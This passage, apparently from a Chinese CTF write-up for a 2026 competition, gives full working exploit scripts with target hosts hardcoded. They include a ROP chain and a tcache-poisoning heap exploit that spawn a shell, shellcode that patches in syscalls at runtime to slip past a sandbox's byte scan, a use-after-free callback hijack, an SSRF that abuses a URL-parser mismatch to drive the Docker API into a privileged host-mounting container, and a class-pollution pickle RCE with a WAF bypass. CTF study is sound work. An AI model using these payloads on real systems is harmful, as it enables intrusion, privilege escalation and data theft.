PUTS_GOT = 0x404018
SERVE_LOOP = 0x4015F9

LIBC_PUTS   = 0x84420
LIBC_SYSTEM = 0x52290
LIBC_BINSH  = 0x1B45BD

context.log_level = "info"
socket.setdefaulttimeout(15)


def hdr(cmd, reqid, sid, ntlv):
    return b"WG" + p8(cmd) + p8(reqid) + p32(sid) + p8(ntlv)


def tlv(t, v):
    return p8(t) + p16(len(v)) + v


def recv_frame(io):
    h = io.recvn(12, timeout=15)
    assert h[:2] == b"WG", h.hex()
    cmd, reqid = h[2], h[3]
    sid = u32(h[4:8])
    ntlv, t, ln = h[8], h[9], u16(h[10:12])
    val = io.recvn(ln, timeout=15) if ln else b""
    return cmd, reqid, sid, t, val


def auth(io):
    io.recvuntil(b"gateway config service\n", timeout=15)
    io.send(hdr(1, 1, 0, 0))
    cmd, _, _, _, chal = recv_frame(io)
    assert cmd == 129 and len(chal) == 16, (cmd, chal.hex())
    resp = SM4(KEY).encrypt_block(chal)
    io.send(hdr(2, 2, 0, 1) + tlv(2, resp))
    cmd, _, sid, t, val = recv_frame(io)
    assert cmd == 130 and t == 3 and len(val) == 4, (cmd, t, val)
    return u32(val)


def cmd3(io, sid, plain):
    ct = SM4(KEY).ctr_crypt(plain, sid)
    io.send(hdr(3, 3, sid, 1) + tlv(0x20, ct))
    cmd, _, _, _, msg = recv_frame(io)
    return cmd, msg


def try_align(pad1, pad2):
    io = remote(HOST, PORT, timeout=15)
    try:
        sid = auth(io)
        log.info(f"authed, sid={sid:#x}")
        # stage 1: leak puts@got, then re-enter serve_loop
        chain1 = [RET] * pad1 + [POP_RDI, PUTS_GOT, PUTS_PLT, SERVE_LOOP]
        p1 = b"A" * 200 + b"".join(p64(x) for x in chain1)
        assert len(p1) <= 256
        cmd, msg = cmd3(io, sid, p1)
        log.info(f"stage1 reply: {cmd} {msg}")
        io.send(b"XX" + b"\x00" * 7)  # bad magic -> serve_loop returns -> ROP
        leak = io.recvuntil(b"\n", timeout=15)
        if len(leak) < 2:
            raise EOFError("no leak")
        leak = leak[:-1]
        puts_addr = u64(leak.ljust(8, b"\x00"))
        libc = puts_addr - LIBC_PUTS
        log.success(f"leak puts={puts_addr:#x} libc={libc:#x}")
        # stage 2: system("/bin/sh")
        chain2 = [RET] * pad2 + [POP_RDI, libc + LIBC_BINSH, RET, libc + LIBC_SYSTEM]
        p2 = b"B" * 200 + b"".join(p64(x) for x in chain2)
        assert len(p2) <= 256
        cmd, msg = cmd3(io, sid, p2)
        log.info(f"stage2 reply: {cmd} {msg}")
        io.send(b"XX" + b"\x00" * 7)
        io.send(b"cat /flag /flag.txt flag /home/*/flag* 2>/dev/null; echo GW_DONE\n")
        out = io.recvuntil(b"GW_DONE", timeout=15)
        return out
    finally:
        io.close()


def main():
    for pad1 in (0, 1):
        for pad2 in (0, 1):
            try:
                out = try_align(pad1, pad2)
            except Exception as e:
                log.warning(f"pad1={pad1} pad2={pad2} failed: {e}")
                continue
            txt = out.decode("latin-1", "replace")
            print(txt)
            m = re.findall(rb"(?:flag|FLAG|gwctf|GWCTF)\{[^}]*\}", out)
            if m:
                log.success(f"FLAG: {m[0].decode()}")
                print("FLAG=" + m[0].decode())
                return
            log.warning(f"pad1={pad1} pad2={pad2}: no flag in output")
    print("FAILED")


if __name__ == "__main__":
    main()
```


---

### 9. vault（pn-04）

#### Summary

隐藏菜单 31337 输入真主密钥解锁 Enhance，`size+1` 读取形成 **off-by-one** 覆写 chunk size LSB → chunk 放大制造重叠 → **safe-linking tcache poisoning** 任意读写 → 泄 heap/libc、读 __environ 定位栈 → 覆写 main 返回地址打 ROP。

#### Solution

- 真主密钥 `V4ult_0verfl0w!!` 由 `byte_21C0 ^ byte_21D0 ^ 31*i` 推出；strncmp 的 `"Sup3rS3cr3t_K3y!"` 是干扰项。
- off-by-one 把 0x211 chunk 放大为 0x2f1；poison 前须先放一个 decoy 凑 tcache count=2（glibc 2.39 tcache 门：count=1 时第二次 malloc 不走 tcache）。
- 任意读泄 libc（unsorted bin fd，delta 0x203b20）与 heap（tcache fd>>12）；任意读目标值须避开 chunk 偏移 8..15（tcache_get 会清零 key 字段）。
- 读 `__environ` 拿栈地址，向下扫描定位 main 返回槽（值 == libc+0x2a1ca，即 `__libc_start_call_main` 内 `call rax` 的返回点），覆写 ROP（ret; pop rdi; "/bin/sh"; system），Exit 触发。

#### Flag

```
flag{e9dd40a2-ce9d-4383-832b-234e75fde9fc}
```

#### 工具与版本

- idalib-mcp + Docker（pwntools + gdb 解题镜像 ctf-pwn04）；`exp.py REMOTE HOST=123.56.22.57 PORT=28674`。

#### 完整脚本

`pn-04/exp.py`：

```python
#!/usr/bin/env python3
# exp.py — vault (湾区杯2026 pwn-04)
# Bug: hidden menu 31337 + master key "V4ult_0verfl0w!!" unlocks "Enhance",
#      which reads size+1 bytes -> 1-byte overflow of next chunk size LSB.
# Chain: off-by-one chunk enlarge -> overlap -> tcache poisoning (safe-linking)
#        -> arbitrary R/W -> leak environ (stack) -> scan for main's return
#        address slot (value == libc + ret-off) -> overwrite with ROP ->
#        Exit -> system("/bin/sh") -> cat flag.
#
# Usage:
#   local : python3 exp.py            (runs via ./ld-linux-x86-64.so.2, cwd has vault/libc)
#   remote: python3 exp.py REMOTE HOST=x.x.x.x PORT=nnnn
from pwn import *
import re
import sys

context.log_level = 'info'
context.timeout = 10

LD = './ld-linux-x86-64.so.2'
VAULT = './vault'
KEY = b'V4ult_0verfl0w!!'

libc = ELF('./libc.so.6', checksec=False)

# ---- offsets for this libc (measured locally, see measure.py / disasm_lsm.py) ----
MAIN_ARENA_DELTA = 0x203b20          # unsorted-bin fd value = libc_base + delta
ENVIRON   = libc.symbols['environ']  # 0x20ad58
SYSTEM    = libc.symbols['system']   # 0x58750
BINSH     = next(libc.search(b'/bin/sh\x00'))  # 0x1cb42f
POP_RDI   = 0x10c08d
RET_GAD   = 0x2882f
# return address (offset in libc) that main() returns to: `call rax` (main)
# at 0x2a1c8 inside __libc_start_call_main -> ret addr 0x2a1ca
RET_CANDIDATES = [0x2a1ca]

HOST = args.HOST or ''
PORT = int(args.PORT or 0)

def start():
    if HOST:
        return remote(HOST, PORT, timeout=10)
    return process([LD, '--library-path', '.', VAULT])

io = start()

# ---- slot model (store() picks lowest free slot) ----
free_slots = list(range(16))

def cmd(n):
    io.sendlineafter(b'> ', str(n).encode())

def store(sz):
    idx = free_slots.pop(0)
    cmd(1); io.sendlineafter(b'Size: ', str(sz).encode())
    return idx

def edit(i, d):
    cmd(2); io.sendlineafter(b'Slot: ', str(i).encode()); io.sendafter(b'Data: ', d)

def enhance(i, d):
    cmd(6); io.sendlineafter(b'Slot: ', str(i).encode()); io.sendafter(b'Enhanced data: ', d)

def view(i, n):
    cmd(3); io.sendlineafter(b'Slot: ', str(i).encode()); return io.recvn(n)

def discard(i):
    cmd(4); io.sendlineafter(b'Slot: ', str(i).encode())
    free_slots.append(i); free_slots.sort()

# ---- 0. master key -> clearance ----
cmd(31337)
io.sendlineafter(b'Master key: ', KEY)
r = io.recvline()
assert b'granted' in r, r
log.success('keeper clearance granted')

# ---- 1. heap leak (freed tcache chunk fd = chunk_addr >> 12 when bin empty) ----
s0 = store(0x18)          # slot 0
discard(s0)
s0 = store(0x18)          # slot 0 again, old fd intact
heap_fd = u64(view(s0, 8))
heap = heap_fd << 12
log.info('heap base = %#x', heap)

# ---- 2. libc leak (unsorted bin fd/bk survive realloc) ----
s1 = store(0x4f0)         # big chunk -> unsorted on free
sg = store(0x18)          # guard vs top consolidation
discard(s1)
s1 = store(0x4f0)
libc_leak = u64(view(s1, 8))
libc_base = libc_leak - MAIN_ARENA_DELTA
log.info('libc base = %#x', libc_base)
assert libc_base & 0xfff == 0, 'bad libc leak %#x' % libc_leak

# ---- 3. overlap layout: A(off-by-one) | B(enlarge victim) | C(poison target) | D(guard) ----
# heap layout so far: s0@0x2a0, s1@0x2c0(0x500), sg@0x7c0, then top:
#   A@0x7e0(0x20) B@0x800(0x210) C@0xa10(0xe0) D@0xaf0(0x20)
C_user = heap + 0xa20
A = store(0x18)
B = store(0x208)
C = store(0xd8)
D = store(0x18)
assert (A, B, C, D) == (3, 4, 5, 6), (A, B, C, D)
CSLOT = C

# enlarge B: size LSB 0x11 -> 0xf1  => chunk size 0x2f0, covers C entirely
enhance(A, b'A' * 0x18 + b'\xf1')
discard(B)                     # B(0x2f1) -> tcache[0x2f0]
Bp = store(0x2e8)              # B' covers B+C
assert Bp == B

def poison(target):
    """Free a decoy + C into tcache[0xe0] (count must be >=2 for the poisoned
    next pointer to be consumed via tcache_get), poison C.next, then alloc the
    pair. Returns (cslot, tslot): cslot == C re-allocated, tslot == target."""
    decoy = store(0xd8)
    discard(decoy)
    discard(CSLOT)
    payload = bytearray(b'\x00' * 0x2e8)
    payload[0x208:0x210] = p64(0xe1)                       # keep C chunk header sane
    payload[0x210:0x218] = p64((C_user >> 12) ^ target)    # safe-linking
    edit(Bp, bytes(payload))
    cs = store(0xd8)      # returns C
    ts = store(0xd8)      # returns target
    assert cs == CSLOT
    return cs, ts

def arb_read(addr):
    """One-shot arbitrary read. Fake chunk base is placed 0x10 below the aligned
    address so the wanted qword never sits at offset 8..15 -- tcache_get zeroes
    e->key (qword at chunk+8) when the fake chunk is allocated."""
    target = (addr & ~0xf) - 0x10
    cs, ts = poison(target)
    return view(ts, 0xd8)[addr - target:]

# ---- 4. arbitrary read: environ -> stack ----
env_addr = libc_base + ENVIRON
envbuf = arb_read(env_addr)
environ_val = u64(envbuf[:8])
log.info('__environ = %#x', environ_val)
assert environ_val & 0xfff != 0 and environ_val >> 40 == 0x7f, 'bad environ %#x' % environ_val

# ---- 5. scan stack downwards for main's return-address slot ----
# (offset 8 of each read window is clobbered by tcache_get's key zeroing -> skip it)
slot = None
w = ((environ_val - 0x100) & ~0xf) - 0x10
for _ in range(6):
    cs, ts = poison(w)
    data = view(ts, 0xd8)
    for i in range(0, 0xd8 - 8, 8):
        if i == 8:
            continue
        v = u64(data[i:i+8])
        if v - libc_base in RET_CANDIDATES:
            slot = w + i
            log.success('ret slot @ %#x (value %#x, off %#x)', slot, v, v - libc_base)
            break
    if slot:
        break
    w -= 0xd0
assert slot, 'return slot not found'

# ---- 6. write ROP chain over main's return address ----
w = slot & ~0xf
off = slot - w
# align rsp to 16 at system() entry: n rets such that slot + 8*n + 0x18 == 8 (mod 16)
n_ret = 1 if slot % 16 == 8 else 0
chain = p64(libc_base + RET_GAD) * n_ret + p64(libc_base + POP_RDI) + p64(libc_base + BINSH) + p64(libc_base + SYSTEM)
payload = bytearray(b'\x00' * 0xd8)
payload[off:off + len(chain)] = chain
cs, ts = poison(w)
edit(ts, bytes(payload))
log.success('ROP chain planted @ %#x', slot)

# ---- 7. exit -> shell ----
cmd(5)
io.sendline(b'echo PWNED; cat /flag 2>/dev/null; cat flag 2>/dev/null; cat /home/ctf/flag 2>/dev/null; echo END_MARKER')
try:
    out = io.recvuntil(b'END_MARKER', timeout=10)
except EOFError:
    out = b''
    log.failure('connection closed before END_MARKER')
sys.stdout.write('\n===== OUTPUT =====\n')
sys.stdout.write(out.decode('latin-1', 'replace'))
sys.stdout.write('\n==================\n')
m = re.search(rb'(flag\{[^}]*\}|FLAG\{[^}]*\}|[A-Za-z0-9_]+\{[^}]{4,}\})', out)
if m:
    log.success('FLAG: %s', m.group(1).decode('latin-1'))
else:
    log.failure('no flag pattern in output')
io.close()
```


---

### 10. jit_sandbox（pwn-01 / pwn05）

#### Summary

JIT 沙箱逃逸：payload 页初始 R-X，入口 `call rdx`（内联 mprotect）恢复 RWX 后，**运行时把代码内 nop;nop 桩现场 patch 成 `0f 05` syscall**，绕过载入期对裸 syscall/execve 字节扫描，ORW 读 flag。

#### Solution

- seccomp 白名单 read/write/openat/close/mprotect/exit 覆盖所需 syscall，无需逃逸 seccomp 本身。
- 入口寄存器 rdi=page/rsi=len/rdx=jit_commit（idalib 复核），首指令 `call rdx` 恢复 RWX。
- 把 `nop;nop` 字节 patch 成 `0x0f 0x05`（syscall），随后 openat/read/write 三段 ORW 打到 stdout。
- 远程 flag 在进程 CWD 相对路径 `flag`（/flag、/flag.txt 均不存在，候选列表自动探测命中）。

#### Flag

```
flag{c3beac0d-a31a-49b6-9017-d1f6aa3d17e1}
```

#### 工具与版本

- idalib-mcp + pwntools（容器内）+ Docker jit-sandbox-env；本地三重验证（/flag、/flag.txt、默认候选探测）后 `exp_remote.py` 打 59.110.235.192:20541。

#### 完整脚本

`pwn-01/exp_remote.py`：

```python
#!/usr/bin/env python3
"""pwn05 jit_sandbox — remote variant (verified payload logic, see exp.py)."""
import os
import re
import sys

from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOG_LEVEL", "error")

HOST = os.environ.get("HOST", "59.110.235.192")
PORT = int(os.environ.get("PORT", "20541"))
CANDIDATE_PATHS = os.environ.get(
    "FLAG_PATHS", "/flag,/flag.txt,flag,flag.txt,/home/ctf/flag,/root/flag"
).split(",")
BUF_OFF = 0x800


def build_payload(flag_path: str) -> bytes:
    sc = asm(
        f"""
start:
    mov r8, rdi
    call rdx

    mov byte ptr [r8 + (stub - start)], 0x0f
    mov byte ptr [r8 + (stub - start) + 1], 0x05

    push -100
    pop rdi
    lea rsi, [r8 + (flagstr - start)]
    xor edx, edx
    mov eax, 257
    call stub
    test rax, rax
    js done

    mov rdi, rax
    lea rsi, [r8 + {BUF_OFF}]
    mov edx, 0x100
    xor eax, eax
    call stub

    mov rdx, rax
    mov edi, 1
    lea rsi, [r8 + {BUF_OFF}]
    mov eax, 1
    call stub

done:
    mov eax, 231
    xor edi, edi
    call stub

stub:
    nop
    nop
    ret

flagstr:
    .ascii "{flag_path}"
    .byte 0
"""
    )
    assert len(sc) <= 0x200, f"payload too big: {len(sc)}"
    assert 0x3B not in sc, "payload contains 0x3b"
    assert b"\x0f\x05" not in sc, "payload contains raw syscall bytes"
    assert b"/bin/sh" not in sc, "payload contains /bin/sh"
    return sc


def try_path(flag_path: str) -> bytes:
    payload = build_payload(flag_path)
    io = remote(HOST, PORT, timeout=15)
    try:
        io.recvuntil(b"payload > ", timeout=10)
        io.send(payload)
        out = io.recvall(timeout=10)
    finally:
        io.close()
    return out


def main() -> int:
    if len(sys.argv) > 1:
        candidates = sys.argv[1]
    else:
        candidates = CANDIDATE_PATHS
    for path in candidates:
        try:
            out = try_path(path)
        except Exception as e:
            print(f"[*] {path}: error: {e}")
            continue
        print(f"[*] tried {path!r}: got {len(out)} bytes")
        if out:
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.flush()
            m = re.search(rb"(flag|FLAG|ctf|CTF|wmctf|DASCTF|NSSCTF)\{[^}]*\}", out)
            if m:
                print(f"\n[+] FLAG: {m.group(0).decode(errors='replace')}")
                return 0
    print("[-] no flag-like output from any candidate path")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```


---

### 11. archivefs（pwn-02 / pwn06）

#### Summary

菜单堆题 UAF：recycle_document free(doc->content) 后不清指针，struct(0x40) 与 content(0x40) 同属 tcache 0x50 bin，新建结构体复用刚释放的 content chunk 形成重叠；UAF write 覆写 callback 为 seccomp 白名单内的读 flag 函数。

#### Solution

- PIE 基址由 preview_callback 的 "plugin token" 泄露。
- revise_document 的 UAF write 把重叠结构体 callback 覆写为 `stream_sync_driver`（open/read/write/exit 读 ./flag）。
- preview 触发即得 flag；远程仅把 process Tube 换 TCP socket Tube，2/2 稳定命中。

#### Flag

```
flag{2235ebfe-28ed-4ca7-bea2-2d01e37ee029}
```

#### 工具与版本

- 宿主 python（socket，无 pwntools 依赖）；`exp_remote.py 47.94.96.248 36901`。

#### 完整脚本

`pwn-02/exp_remote.py`：

```python
#!/usr/bin/env python3
# archivefs (pwn06 / 湾区杯2026) exploit — 远程 TCP socket 版
# 利用链与 exp.py 完全一致:
#   1. create(0) + preview(0): "plugin token" 泄露 PIE 基址
#   2. recycle(0): doc0 content chunk 进 tcache 0x50 bin
#   3. create(1): struct malloc 复用该 chunk, 与 doc0->content 重叠
#   4. revise(0): UAF write 覆写 doc1 结构体 callback -> stream_sync_driver
#   5. preview(1): 触发 callback, open/read ./flag 打印后 exit
# 全部网络读写带超时, 无 pwntools 依赖, 可独立复跑。
import re
import socket
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

OFF_PREVIEW_CB = 0x1712
OFF_SYNC_DRIVER = 0x17A9

TIMEOUT = 10.0
SIZE = 0x40


class Tube:
    def __init__(self, host, port, timeout=TIMEOUT):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""

    def send(self, data):
        self.s.sendall(data)

    def recvuntil(self, delim, timeout=TIMEOUT):
        self.s.settimeout(timeout)
        while delim not in self.buf:
            chunk = self.s.recv(4096)
            if not chunk:
                raise EOFError("connection closed, buf=%r" % self.buf[-400:])
            self.buf += chunk
        i = self.buf.index(delim) + len(delim)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out

    def drain(self, timeout=5.0):
        # 目标打完 flag 会 exit(0) 关连接; 读直到 EOF 或超时
        out = self.buf
        self.buf = b""
        self.s.settimeout(timeout)
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        return out

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def create(t, idx, name, content):
    t.recvuntil(b"> ")
    t.send(b"1\n")
    t.recvuntil(b"document id: ")
    t.send(b"%d\n" % idx)
    t.recvuntil(b"content size: ")
    t.send(b"%d\n" % SIZE)
    t.recvuntil(b"name: ")
    assert len(name) == 0x20
    t.send(name)
    t.recvuntil(b"content: ")
    assert len(content) == SIZE
    t.send(content)


def preview(t, idx):
    t.recvuntil(b"> ")
    t.send(b"3\n")
    t.recvuntil(b"document id: ")
    t.send(b"%d\n" % idx)
    return t.recvuntil(b"---- end preview ----\n")


def recycle(t, idx):
    t.recvuntil(b"> ")
    t.send(b"4\n")
    t.recvuntil(b"document id: ")
    t.send(b"%d\n" % idx)


def revise(t, idx, data):
    t.recvuntil(b"> ")
    t.send(b"2\n")
    t.recvuntil(b"document id: ")
    t.send(b"%d\n" % idx)
    t.recvuntil(b"revision data: ")
    assert len(data) == SIZE
    t.send(data)


def exploit(host, port):
    t = Tube(host, port)
    try:
        # 1) 泄露 PIE 基址
        create(t, 0, b"A" * 0x20, b"B" * SIZE)
        out = preview(t, 0)
        m = re.search(rb"plugin token: (0x[0-9a-f]{16})", out)
        if not m:
            raise RuntimeError("no plugin token in %r" % out)
        pie = int(m.group(1), 16) - OFF_PREVIEW_CB
        sync_driver = pie + OFF_SYNC_DRIVER
        print("[*] PIE base    = %#x" % pie)
        print("[*] sync_driver = %#x" % sync_driver)

        # 2) 回收 doc0 → content chunk 进 tcache 0x50 bin
        recycle(t, 0)

        # 3) create(1): struct malloc 复用 doc0 的 content chunk
        create(t, 1, b"C" * 0x20, b"D" * SIZE)

        # 4) UAF write: 覆写 doc1 结构体
        payload = b"E" * 0x20 + p64(0) + p64(SIZE) + p64(sync_driver) + p64(1)
        revise(t, 0, payload)

        # 5) preview(1) → 被劫持 callback 读 ./flag 打印, 随后进程 exit
        t.recvuntil(b"> ")
        t.send(b"3\n")
        t.recvuntil(b"document id: ")
        t.send(b"1\n")
        final = t.drain()
        sys.stdout.buffer.write(final)
        sys.stdout.flush()
        m = re.search(rb"[A-Za-z0-9_]+\{[^\}\n]+\}", final)
        if m:
            print("\n[+] FLAG: " + m.group(0).decode(errors="replace"))
            return True
        print("\n[-] flag pattern not found in final output")
        return False
    finally:
        t.close()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "47.94.96.248"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 36901
    # 堆布局可能受远程环境影响, 重试若干次
    for attempt in range(1, 6):
        print("[*] attempt %d: connecting %s:%d" % (attempt, host, port))
        try:
            if exploit(host, port):
                return 0
        except Exception as e:
            print("[!] attempt %d failed: %r" % (attempt, e))
    print("[-] all attempts failed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```


---

## Web

### 12. DockRelay（web-01）

#### Summary

内部"伙伴诊断中继"只允许请求 `hooks.partner.test`，但 **Node `new URL()`（WHATWG）与 libcurl 7.88.1 对同一 URL 的解释不同**。利用解析分歧绕过白名单做 SSRF 到内网 Docker 引擎，创建挂载宿主根目录的特权容器读日志取 flag。

#### Solution

- payload：`http://hooks.partner.test\@engine-api:2375/<path>`——Node 把 `\` 视为主机终止（host 合法），libcurl 把 `hooks.partner.test\` 当 userinfo（真实 host=engine-api:2375）。
- 打 `/version` 确认 Docker 1.47；高风险端点被 nested-host gate 403，但放行 `POST /containers/create`。
- create（Image=host-reader:1.0, Privileged=true, Binds=/:/host:ro）→ start → `GET /containers/<id>/logs` 读 flag。
- 完整 exploit 与输出见 `web-01/[Web]DockRelay.md`。

#### Flag

```
flag{d518cd40-f067-421e-b97e-b00265832a3d}
```

#### 完整脚本

完整 solver（来自 `web-01/[Web]DockRelay.md`）：

```python
#!/usr/bin/env python3
"""
DockRelay (web-01) — SSRF to Docker API chain exploiting Node WHATWG URL vs libcurl
parsing discrepancy.

Chain:
 1. Node `new URL()` sees hostname "hooks.partner.test"  -> passes partner policy
 2. libcurl 7.88.1 parses the SAME url and connects to engine-api:2375 (Docker API)
    because the backslash-userinfo splice makes curl treat "hooks.partner.test\\" as
    userinfo and "engine-api:2375" as the host.
 3. Drive the Docker API over that SSRF: create a Privileged container that bind-mounts
    host root read-only (/:/host:ro), start it, then read its logs -> flag.

The payload URL (backslash in a JSON string):
    http://hooks.partner.test\\@engine-api:2375/<path>
"""
import json
import re
import urllib3
import requests

urllib3.disable_warnings()

TARGET = "https://eci-2zegvtlyap9104yqfazs.cloudeci1.ichunqiu.com:3000/api/v1/diagnostics/execute"
ENGINE = "http://hooks.partner.test\\@engine-api:2375"
TIMEOUT = 20
FLAG_RE = re.compile(r"(flag|DASCTF|CTF)\{[^}]+\}", re.I)


def ssrf(url: str, method: str = "GET", body=None) -> dict:
    """Send a diagnostics request. Returns the upstream dict (status, bodyText/bodyBase64)."""
    payload = {"method": method, "url": url}
    if body is not None:
        payload["body"] = body
    r = requests.post(TARGET, json=payload, timeout=TIMEOUT, verify=False)
    data = r.json()
    return data.get("upstream", {})


def upstream_text(up: dict) -> str:
    if up.get("bodyText"):
        return up["bodyText"]
    b64 = up.get("bodyBase64")
    if b64:
        import base64
        return base64.b64decode(b64).decode("utf-8", "replace")
    return ""


def create_container() -> str:
    cfg = {"Image": "host-reader:1.0", "HostConfig": {"Privileged": True, "Binds": ["/:/host:ro"]}}
    up = ssrf(ENGINE + "/containers/create", "POST", cfg)
    status = up.get("status")
    text = upstream_text(up)
    if status != 201:
        raise RuntimeError(f"create failed: status={status} body={text}")
    return json.loads(text)["Id"]


def start_container(cid: str) -> None:
    up = ssrf(ENGINE + f"/containers/{cid}/start", "POST", None)
    if up.get("status") not in (204, 304):
        raise RuntimeError(f"start failed: status={up.get('status')} body={upstream_text(up)}")


def read_flag(cid: str) -> str:
    up = ssrf(ENGINE + f"/containers/{cid}/logs", "GET", None)
    text = upstream_text(up)
    m = FLAG_RE.search(text)
    if not m:
        raise RuntimeError(f"no flag in logs: status={up.get('status')} body={text[:300]}")
    return m.group(0)


def main():
    cid = create_container()
    print(f"[+] container created: {cid}")
    start_container(cid)
    print(f"[+] container started: {cid}")
    flag = read_flag(cid)
    print(f"[+] FLAG: {flag}")
    flag2 = read_flag(cid)
    print(f"[+] FLAG (re-read): {flag2}")
    assert flag == flag2, "flag not stable!"
    print("FLAG=" + flag)


if __name__ == "__main__":
    main()
```


---

### 13. ShadowArchive（web-01，hard，122 分）

#### Summary

Flask 内部工作区配置归档系统。表面没有 pickle 上传、还把危险关键字过滤了，实际漏洞在 `update_profile` 的 `vulnerable_deep_merge`——对 `UserProfile` 实例做**递归属性污染**，借道 `profile.export.__func__.__globals__` 写进 `models` 模块的类属性，翻转 `ArchiveSnapshot.reduce_mode`、`SafeUnpickler.strict`、`PermissionPolicy.default_restore` 三个开关，让普通 `guest` 用户就能导出「引用 `ReplayProgram.run` 的 pickle 归档」并在 `/admin/restore` 触发 RCE 读 `/flag`。

#### Solution

- **三个关键点**：`vulnerable_deep_merge` 对非 dict 的 dst 递归 `getattr`/`setattr`，可一路写到 `profile.export.__func__.__globals__`（即 `models` 模块 globals）；`ArchiveSnapshot.__reduce__` 在 `reduce_mode=="legacy_task"` 时返回 `(ReplayProgram.run, (program,))`；`SafeUnpickler` 默认 `strict=True` 只放行白名单。
- **类污染翻三开关**（一次 JSON 全写进 models globals）：`ArchiveSnapshot.reduce_mode="legacy_task"`、`SafeUnpickler.strict=False + recursive_lookup=True`（`find_class` 放行点号名进 `allowed_roots`）、`PermissionPolicy.default_restore=True`（guest 自己过 `can_restore()`，**无需伪造管理员 session**）。
- **gadget**：`profile.archive.program` 写 `root="builtins"`，ops 依次 `attr open` → `call ["/flag","r"]` → `call_attr read`。
- **WAF 双绕过**：① `check_raw_body` 子串匹配拦 `__globals__` —— JSON 键写成 `"\u005f\u005fglobals\u005f\u005f"`，原始 body 无字面子串、服务端 `json.loads` 解回原名；② `scan_pickle_bytes` 只拦 `os\nsystem`/`posix\nsystem`/`subprocess`/`eval(`/`exec(` —— 选 `open+read` 天然不含，直接放行。
- **误导项**：`SECRET_KEY="shadow-archive-development-key"` 是幌子（部署实例已改 key，伪造 admin session 实测被拒）；走 `default_restore=True` 全程不需要管理员。
- 先读 `/etc/passwd` 验证 gadget 真实执行（非状态残留），再读 `/flag`；连跑 3 次结果一致。

#### Flag

```
flag{553702f8-5774-4624-bf90-a5994f6142af}
```

#### 工具与版本

- python3 + `requests`（`verify=False`，带 timeout）；靶机 `https://eci-2zeaq8y4b0vcyb3h4a7d.cloudeci1.ichunqiu.com:5000`；完整 WP 见 `web-01/[Web]ShadowArchive.md`

#### 完整脚本

完整 solver（来自 `web-01/[Web]ShadowArchive.md`）：

```python
#!/usr/bin/env python3
# ShadowArchive (web-01) solver
import os, re, json, sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "source")))
import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://eci-2zeaq8y4b0vcyb3h4a7d.cloudeci1.ichunqiu.com:5000"

def build_program(path):
    return {"root": "builtins", "ops": [
        {"attr": "open"}, {"call": [path, "r"]}, {"call_attr": "read"}]}

def raw_body(program):
    payload = {
        "archive": {"program": program},
        "export": {"__func__": {"__globals__": {
            "ArchiveSnapshot": {"reduce_mode": "legacy_task"},
            "SafeUnpickler": {"strict": False, "recursive_lookup": True},
            "PermissionPolicy": {"default_restore": True},
        }}},
    }
    text = json.dumps(payload, separators=(",", ":"))
    return text.replace('"__globals__"', '"\\u005f\\u005fglobals\\u005f\\u005f"')

def run_archive(s, path):
    r = s.post(BASE + "/api/settings/profile", data=raw_body(build_program(path)),
               headers={"Content-Type": "application/json"}, verify=False, timeout=20)
    if r.status_code != 200:
        return None
    r = s.post(BASE + "/archive/export", verify=False, timeout=20)
    aid = r.json().get("archive_id")
    r = s.post(BASE + "/admin/restore/" + aid, verify=False, timeout=20)
    m = re.search(r'<pre class="output">(.*?)</pre>', r.text, re.S)
    return m.group(1) if m else r.text

s = requests.Session()
s.post(BASE + "/login", data={"username": "guest", "password": "guest"},
       verify=False, timeout=20, allow_redirects=False)

print("== read /etc/passwd (liveness proof) ==")
print(run_archive(s, "/etc/passwd"))
print("\n== read /flag ==")
flag = run_archive(s, "/flag")
print(flag)

fl = re.findall(r'flag\{[^}]+\}', str(flag) or "")
print("\n[FLAG]", fl[0] if fl else "NOT FOUND")
```

---

## Reverse

### 14. rift_runner（rev-01）

#### Summary

jadx 反编译 MainActivity.verify() 发现 xorshift128 的四个种子**全部由 EXPECTED_* 常量构造、与实际路线无关**——直接用常量重建密钥流异或解密 ENC[34]，绕开地图寻路。

#### Solution

- 种子来源：hash^0x24364...、score、len^energy<<24、nativeGate，均为常量。
- librtrack.so 的 native gate 用 idalib 反编译移植 Python，验证 `mx(EXPECTED_HASH, EXPECTED_SCORE, 29, 47) == EXPECTED_NATIVE_GATE` 自洽。
- 解密字节逐位重加密 == ENC 原文，格式断言（f...{...}）全过。
- 旁证：题设的 LCG 解码器解出的 11x11 地图根本不含 '#','S','1' 等地物字符，路线搜索路线疑似死路（出题方数据问题）。

#### Flag

```
flag{rift_runner_native_path_8613}
```

#### 工具与版本

- jadx-mcp + idalib-mcp + 宿主 python3.12（无三方库）。

#### 完整脚本

`rev-01/solve.py`：

```python
#!/usr/bin/env python3
# rift_runner solver — 湾区杯2026 RE
# 关键洞察: verify() 里 xorshift128 的四个种子全部由「期望值常量」异或而来
# (hash=EXPECTED_HASH, score=EXPECTED_SCORE, energy=EXPECTED_ENERGY, len=EXPECTED_LEN,
#  nativeGate=EXPECTED_NATIVE_GATE)，与玩家实际 route 无关。
# 因此无需还原地图/路线，直接用常量重建密钥流，对 ENC 做异或解密。
# 另附 native gate (librtrack.so mx) 的 python 移植与自洽性校验。

M32 = 0xFFFFFFFF

def u32(x): return x & M32
def i32(x):
    x &= M32
    return x - 0x100000000 if x >= 0x80000000 else x
def rotl32(x, r):
    x &= M32
    return ((x << r) | (x >> (32 - r))) & M32

# ---- 常量 (classes.dex / MainActivity) ----
EXPECTED_ENERGY       = 29           # 0x1d
EXPECTED_HASH         = 1571834195   # 0x5db04953
EXPECTED_LEN          = 47           # 0x2f
EXPECTED_NATIVE_GATE  = 324854915    # 0x135ce483
EXPECTED_SCORE        = -1321932955  # -0x4ecb189b
ENC = [33, 158, 178, 65, 175, 136, 243, 232, 151, 105, 86, 142, 51, 174,
